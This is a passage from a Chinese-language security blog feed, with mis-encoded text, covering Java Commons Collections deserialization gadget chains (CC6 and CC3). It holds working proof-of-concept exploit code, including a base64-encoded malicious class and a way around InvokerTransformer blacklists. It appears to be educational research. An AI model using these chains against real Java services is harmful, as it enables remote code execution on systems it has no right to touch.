class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">public class CC66 &#123;  </span><br><span class="line">  </span><br><span class="line">    public static void main(String[] args) throws  Exception&#123;  </span><br><span class="line">  </span><br><span class="line">        //Runtimeæ„é€ éƒ¨åˆ†  </span><br><span class="line">        Transformer[] fakeTransformers = new Transformer[] &#123;new ConstantTransformer(1)&#125;;  </span><br><span class="line">        Transformer[] exp = new Transformer[]&#123;  </span><br><span class="line">            new ConstantTransformer(Class.forName(&quot;java.lang.Runtime&quot;)),  </span><br><span class="line">            new InvokerTransformer(  </span><br><span class="line">                &quot;getMethod&quot;,  </span><br><span class="line">                new Class[]&#123;String.class,Class[].class&#125;,  </span><br><span class="line">                new Object[]&#123;&quot;getRuntime&quot;,new Class[0]&#125;  </span><br><span class="line">            ),  </span><br><span class="line">            new InvokerTransformer(  </span><br><span class="line">                &quot;invoke&quot;,  </span><br><span class="line">                new Class[]&#123;Object.class,Object[].class&#125;,  </span><br><span class="line">                new Object[]&#123;null,new Object[0]&#125;  </span><br><span class="line">            ),  </span><br><span class="line">            new InvokerTransformer(  </span><br><span class="line">                &quot;exec&quot;,  </span><br><span class="line">                new Class[]&#123;String.class&#125;,  </span><br><span class="line">                new Object[]&#123;&quot;calc&quot;&#125;  </span><br><span class="line">            )  </span><br><span class="line">        &#125;;  </span><br><span class="line">        //ChainedTransformeræ„é€ éƒ¨åˆ†  </span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers);  </span><br><span class="line">  </span><br><span class="line">        //LazyMapæ„é€ éƒ¨åˆ†  </span><br><span class="line">        HashMap innerMap = new HashMap();  </span><br><span class="line">        Map outMap = LazyMap.decorate(innerMap, chainedTransformer); //outMap = LazyMapç±»  </span><br><span class="line">  </span><br><span class="line">        //TiedMapEntryæ„é€ éƒ¨åˆ†  </span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(outMap, &quot;Ku1s-1&quot;);  </span><br><span class="line">  </span><br><span class="line">        //HashMapæ„é€ éƒ¨åˆ†  </span><br><span class="line">        HashMap hashMap = new HashMap();  </span><br><span class="line">        hashMap.put(tiedMapEntry,&quot;Ku1s-2&quot;);  </span><br><span class="line">  </span><br><span class="line">        outMap.remove(&quot;Ku1s-1&quot;);  </span><br><span class="line">  </span><br><span class="line">        Class clazz = Class.forName(&quot;org.apache.commons.collections.functors.ChainedTransformer&quot;);  </span><br><span class="line">        Field field = clazz.getDeclaredField(&quot;iTransformers&quot;);  </span><br><span class="line">        field.setAccessible(true);  </span><br><span class="line">        field.set(chainedTransformer,exp);  </span><br><span class="line">  </span><br><span class="line">        byte[] serialize = serialize(hashMap);  </span><br><span class="line">        unserialize(serialize);  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static void unserialize(byte[] bytes) throws Exception&#123;  </span><br><span class="line">        try(ByteArrayInputStream bain = new ByteArrayInputStream(bytes);  </span><br><span class="line">            ObjectInputStream oin = new ObjectInputStream(bain))&#123;  </span><br><span class="line">            oin.readObject();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static byte[] serialize(Object o) throws Exception &#123;  </span><br><span class="line">        try (ByteArrayOutputStream baout = new ByteArrayOutputStream();  </span><br><span class="line">             ObjectOutputStream oout = new ObjectOutputStream(baout)) &#123;  </span><br><span class="line">            oout.writeObject(o);  </span><br><span class="line">            return baout.toByteArray();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/05/17/JAVA-CommonsCollections6/poc.png"></p><p>å¸Œæœ›å¯¹ä½ æœ‰æ‰€å¸®åŠ© ~</p>]]></content>
      
      
      <categories>
          
          <category> JAVAå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA-CommonsCollections3</title>
      <link href="/2023/05/16/JAVA-CommonsCollections3/"/>
      <url>/2023/05/16/JAVA-CommonsCollections3/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸ºä»€ä¹ˆéœ€è¦CommonsCollections3"><a href="#ä¸ºä»€ä¹ˆéœ€è¦CommonsCollections3" class="headerlink" title="ä¸ºä»€ä¹ˆéœ€è¦CommonsCollections3"></a>ä¸ºä»€ä¹ˆéœ€è¦CommonsCollections3</h1><p>ä¸Šç¯‡æ–‡ç«  åˆ†æäº† åŠ¨æ€åŠ è½½å­—èŠ‚ç çš„å±å®³ï¼Œå¦‚æœæœ‰ä¸€ä¸ªå¯æ§çš„httpæœåŠ¡è·¯å¾„ï¼Œåˆ™å¯èƒ½å­˜åœ¨ æ¶æ„åŠ è½½åŠ¨æ€å­—èŠ‚ç ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬å¾ˆè‡ªç„¶çš„ä¼šæƒ³åˆ°ï¼Œå¦‚ä½•æ›´å·§å¦™çš„åˆ©ç”¨ä»–ï¼Œæ‰€ä»¥ CC3 è¯ç”Ÿäº†ã€‚</p><p>CC3 å…¶å®æ˜¯ å’Œ CC1 çš„ç»“åˆ  å³ ä»åŸæ¥çš„ InvokerTransformer åˆ° Runtime.class åˆ°exec() å˜æˆäº† InvokerTransformerè°ƒç”¨ TemplatesImpl#newTransformer()~</p><p>å±Šæ—¶ï¼Œæˆ‘çŒ®å‡ºæˆ‘çè—å·²ä¹…çš„ä¸€å¼ å›¾ï¼š<br><img src="/2023/05/16/JAVA-CommonsCollections3/cc%E9%93%BE.jpg"></p><p>æˆ‘ä»¬åªéœ€è¦å°† CC1 å’Œ CC3 ä¸¤æ®µPOC ç»“åˆä¸€ä¸‹ï¼Œå³å¯å¾ˆå®¹æ˜“çš„æ”¹é€ å‡ºä¸€ä¸ªä»»æ„å­—èŠ‚ç çš„CCé“¾ï¼Œåªéœ€è¦æŠŠCC1ä¸­çš„ InvokerTransformer çš„æ‰§è¡Œæ–¹æ³• æ”¹æˆ TemplatesImpl::newTransformer() å³å¯ï¼š</p><p>POCå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">package CommonsCollections3;</span><br><span class="line"></span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.annotation.Target;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line">import java.util.Base64;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class cc3&#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Templates templates = new TemplatesImpl();</span><br><span class="line">        byte[] bytes = Base64.getDecoder().decode(&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAGwEAClNvdXJjZUZpbGUBAA1FdmlsVGVzdC5qYXZhDAAOAA8HABwMAB0AHgEABGNhbGMMAB8AIAEACEV2aWxUZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAMAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAAEQALAAAABAABAAwAAQAOAA8AAgAJAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAoAAAAOAAMAAAASAAQAEwANABQACwAAAAQAAQAQAAEAEQAAAAIAEg==&quot;);</span><br><span class="line">        setFieldValue(templates,&quot;_name&quot;,&quot;ku1s&quot;);</span><br><span class="line">        setFieldValue(templates,&quot;_bytecodes&quot;,new byte[][]&#123;bytes&#125;);</span><br><span class="line">        setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><span class="line">        //templates.newTransformer();</span><br><span class="line">        </span><br><span class="line">//cc1+cc3</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(templates),</span><br><span class="line">                new InvokerTransformer(&quot;newTransformer&quot;,null,null)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">        </span><br><span class="line">        Map innerMap = new HashMap();</span><br><span class="line"></span><br><span class="line">    Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);</span><br><span class="line"></span><br><span class="line">outerMap.put(&quot;test&quot;, &quot;xxxx&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2023/05/16/JAVA-CommonsCollections3/2.jpg"></p><p>ä½† è¿™ä¸æ˜¯çœŸæ­£çš„ CC3 ï¼ŒCC3çš„ç›®çš„æ˜¯ä¸ºäº†ç»•è¿‡CC1çš„é™åˆ¶ï¼Œä¹Ÿå°±æ˜¯å¯¹InvokerTransformerçš„é™åˆ¶ï¼Œæœ‰äº› ååºåˆ—åŒ–çš„è¿‡æ»¤å™¨çš„é»‘åå• å°±æœ‰äº† InvokerTransformer ï¼Œå› æ­¤CC3çœŸæ­£ç»•è¿‡çš„æ˜¯ä»–ã€‚</p><p>ysoserialçš„ä½œè€…æ‰¾åˆ°äº†com.sun.org.apache.xalan.internal.xsltc.traxä¸‹é¢çš„TrAXFilterç±»ï¼Œå®ƒçš„æ„é€ å™¨éå¸¸æœ‰æ„æ€ï¼Œè°ƒç”¨äº†newTransformer ï¼Œå…å»äº†æˆ‘ä»¬æ‰‹å·¥è°ƒç”¨ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public TrAXFilter(Templates templates)  throws</span><br><span class="line">    TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">    _templates = templates;</span><br><span class="line">    _transformer = (TransformerImpl) templates.newTransformer();</span><br><span class="line">    _transformerHandler = new TransformerHandlerImpl(_transformer);</span><br><span class="line">    _useServicesMechanism = _transformer.useServicesMechnism();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ­£å¦‚æˆ‘ç¬¬ä¸€å¼ å›¾æ‰€ç¤º  ï¼Œå½“ç„¶äº†ï¼Œç¼ºå°‘äº† InvokerTransformerï¼ŒTrAXFilterçš„æ„é€ â½…æ³•ä¹Ÿæ˜¯â½†æ³•è°ƒâ½¤çš„ï¼Œ<br>è¿™é‡Œä¼šç”¨åˆ°ä¸€ä¸ªæ–°çš„ Transformer ï¼š org.apache.commons.collections.functors.InstantiateTransformer  ä»–çš„ä½œâ½¤å°±æ˜¯è°ƒâ½¤æ„é€ â½…æ³•</p><p>æ‰€ä»¥ æˆ‘ä»¬å®ç°çš„ç›®æ ‡å°±æ˜¯ åˆ©ç”¨ InstantiateTransformer å»å®ä¾‹åŒ–è¿™ä¸ª TrAXFilterï¼Œä½¿å…¶å»è‡ªåŠ¨è°ƒç”¨ä»–çš„æ„é€ æ–¹æ³• ï¼Œå…¶æ„é€ æ–¹æ³•å°±ä¼šè‡ªåŠ¨è°ƒç”¨ templates.newTransformer()ï¼Œé‡Œé¢æ”¾å…¥æˆ‘ä»¬çš„å­—èŠ‚ç ï¼Œåˆ™å¯åˆ©ç”¨æˆåŠŸ~  å¦™ï¼</p><h1 id="POCæ„é€ åˆ†æ"><a href="#POCæ„é€ åˆ†æ" class="headerlink" title="POCæ„é€ åˆ†æ"></a>POCæ„é€ åˆ†æ</h1><p>å¯èƒ½å¾ˆå¤šå°ä¼™ä¼´ä¸çŸ¥é“ POCæ˜¯æ€ä¹ˆæ ·çš„ä¸€ä¸ªæµç¨‹ï¼Œè‡ªå†™POCä¹Ÿæ¯”è¾ƒå›°éš¾ï¼Œå¤§éƒ¨åˆ†æ–‡ç« è®²çš„ä¹Ÿæ¨¡æ£±ä¸¤å¯ï¼Œå¸Œæœ›è¿™ä¸ªæ„é€ åˆ†æå¯¹ä½ æœ‰æ‰€å¸®åŠ©</p><h2 id="æ„é€ å­—èŠ‚ç "><a href="#æ„é€ å­—èŠ‚ç " class="headerlink" title="æ„é€ å­—èŠ‚ç "></a>æ„é€ å­—èŠ‚ç </h2><p>è¿™ä¸ªå¤§å®¶åº”è¯¥éƒ½çŸ¥é“ï¼Œå°±æ˜¯è¦åˆ©ç”¨åˆ°æ¶æ„å­—èŠ‚ç ï¼Œä¹Ÿå°±æ˜¯è¦è°ƒç”¨ Templatesimpl.newTransformer å»åŠ è½½æˆ‘ä»¬çš„æ¶æ„å­—èŠ‚ç ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆæ„é€ æ‰€éœ€çš„å­—èŠ‚ç  byteï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">byte[] code = Base64.getDecoder().decode(&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAGwEAClNvdXJjZUZpbGUBAA1FdmlsVGVzdC5qYXZhDAAOAA8HABwMAB0AHgEABGNhbGMMAB8AIAEACEV2aWxUZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAMAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAAEQALAAAABAABAAwAAQAOAA8AAgAJAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAoAAAAOAAMAAAASAAQAEwANABQACwAAAAQAAQAQAAEAEQAAAAIAEg==&quot;);  </span><br><span class="line">TemplatesImpl templates = new TemplatesImpl();  </span><br><span class="line">setFieldValue(templates,&quot;_bytecodes&quot;,new byte[][]&#123;code&#125;);  </span><br><span class="line">setFieldValue(templates,&quot;_name&quot;,&quot;ku1s&quot;);  </span><br><span class="line">setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¸Šç¯‡ æˆ‘ä»¬åˆ†æè¿‡ï¼Œå°†å­—èŠ‚ç  æ”¾å…¥bytecodes ä¸­è¿›è¡ŒåŠ è½½ï¼Œå†æ»¡è¶³ä¸€äº›å‚æ•°éœ€æ±‚åˆ™å¯ä»¥åˆ©ç”¨ æˆåŠŸ</p><p>å†æ­¤ä¹‹å‰ï¼Œæ€è€ƒä¸ªé—®é¢˜ï¼Œ JAVAååºåˆ—åŒ–æ˜¯å¦ä¸åŒäºPHPï¼ŒJAVAçš„åˆ™æ˜¯å…ˆæ„é€ å‡ºå£ï¼Œä¹Ÿå°±æ˜¯ä»åå¾€å‰æ„é€ ï¼ŒPHPåˆ™ç›¸åï¼ˆ å¯èƒ½åªæœ‰æˆ‘è¿™ä¹ˆè®¤ä¸º å“ˆå“ˆå“ˆ</p><h2 id="æ„é€ InstantiateTransformerä¸TrAXFilter"><a href="#æ„é€ InstantiateTransformerä¸TrAXFilter" class="headerlink" title="æ„é€ InstantiateTransformerä¸TrAXFilter"></a>æ„é€ InstantiateTransformerä¸TrAXFilter</h2><p>å¯ä»¥çœ‹åˆ°ç¬¬ä¸€å¼ å›¾ï¼Œæ¥ä¸‹æ¥éœ€è¦æ„é€  TrAXFilter.class äº†ï¼Œå› ä¸ºæ­¤ç±»å¯ä»¥è°ƒç”¨åˆ° newTransformer()<br>ä½†åˆå› ä¸º åˆ©ç”¨ç‚¹æ˜¯æ„é€ å™¨ï¼Œéœ€è¦å®ä¾‹åŒ–æ­¤ç±»æ‰èƒ½è°ƒç”¨ï¼Œåˆ™ åˆå…³è”åˆ°äº†å¦ä¸€ä¸ªç±» InstantiateTransformer.class,è¯¥ç±»æœ‰ TrAXFilter.class éœ€è¦çš„ newInstance() æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬æ„é€ </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] trueTransformers = new Transformer[]&#123;  </span><br><span class="line">    new ConstantTransformer(Class.forName(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&quot;)),  </span><br><span class="line">    new InstantiateTransformer(  </span><br><span class="line">        new Class[]&#123;Templates.class&#125;,  </span><br><span class="line">        new Object[]&#123;templates&#125;  </span><br><span class="line">    )  </span><br><span class="line">&#125;;  </span><br><span class="line">  </span><br><span class="line">ChainedTransformer chainedTransformer = new ChainedTransformer(trueTransformers);</span><br></pre></td></tr></table></figure><p>Transformerå¤§å®¶éƒ½çŸ¥é“ï¼Œæ¥ç€ new InstantiateTransformer()ä¼ å…¥è¿™é‡Œè¿›è¡Œäº† æœ‰å‚æ„é€ ï¼š</p><p><img src="/2023/05/16/JAVA-CommonsCollections3/4.jpg"></p><p>æ¥ç€è°ƒç”¨ transformæ–¹æ³•</p><p>æ­¤æ—¶çš„ con&#x3D;TrAXFilter.class.getConstructor(templates)ï¼Œ ç„¶åè¿™é‡Œçš„IAgs æ˜¯æˆ‘ä»¬çš„å­—èŠ‚ç ~</p><p><img src="/2023/05/16/JAVA-CommonsCollections3/3.jpg"></p><p>ç´§æ¥ç€å°±èƒ½ newInstance() -&gt;newTransformer()</p><p>æ¥ä¸‹æ¥å°±æ˜¯æ‹¼æ¥ CC1 è¿æ¥ InstantiateTransformer.classè¿™æ®µäº†ï¼Œåˆ°äº†è¿™å—ï¼Œå°±å¾ˆç®€å•äº†ï¼Œå°±ç»™Mapè®¾ç½®å‡ ä¸ªåŸºç¡€å€¼å°±å¥½äº†ã€‚</p><p>è¿™é‡Œç›´æ¥è´´äº†ï¼Œå°±ä¸åšè¿‡å¤šè®²è§£ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HashMap innerMap = new HashMap();  </span><br><span class="line">Map outmap = TransformedMap.decorate(innerMap, null, chainedTransformer);  </span><br><span class="line">outmap.put(&quot;test&quot;,&quot;xxx&quot;);</span><br></pre></td></tr></table></figure><p>å®Œæ•´POC:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">public class POC &#123;  </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">        byte[] code = Base64.getDecoder().decode(&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAGwEAClNvdXJjZUZpbGUBAA1FdmlsVGVzdC5qYXZhDAAOAA8HABwMAB0AHgEABGNhbGMMAB8AIAEACEV2aWxUZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAMAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAAEQALAAAABAABAAwAAQAOAA8AAgAJAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAoAAAAOAAMAAAASAAQAEwANABQACwAAAAQAAQAQAAEAEQAAAAIAEg==&quot;);  </span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();  </span><br><span class="line">        setFieldValue(templates,&quot;_bytecodes&quot;,new byte[][]&#123;code&#125;);  </span><br><span class="line">        setFieldValue(templates,&quot;_name&quot;,&quot;ku1s&quot;);  </span><br><span class="line">        setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        Transformer[] trueTransformers = new Transformer[]&#123;  </span><br><span class="line">            new ConstantTransformer(Class.forName(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&quot;)),  </span><br><span class="line">            new InstantiateTransformer(  </span><br><span class="line">                new Class[]&#123;Templates.class&#125;,  </span><br><span class="line">                new Object[]&#123;templates&#125;  </span><br><span class="line">            )  </span><br><span class="line">        &#125;;  </span><br><span class="line">  </span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(trueTransformers);  </span><br><span class="line">  </span><br><span class="line">        HashMap innerMap = new HashMap();  </span><br><span class="line">        Map outmap = TransformedMap.decorate(innerMap, null, chainedTransformer);  </span><br><span class="line">        outmap.put(&quot;test&quot;,&quot;xxx&quot;);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨~</p><p><img src="/2023/05/16/JAVA-CommonsCollections3/exc.jpg"></p><p>å¸Œæœ›å¯¹ä½ æœ‰æ‰€å¸®åŠ© ~</p>]]></content>
      
      
      <categories>
          
          <category> JAVAå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVAåŠ¨æ€åŠ è½½å­—èŠ‚ç </title>
      <link href="/2023/05/16/JAVA%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/"/>
      <url>/2023/05/16/JAVA%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/</url>
      
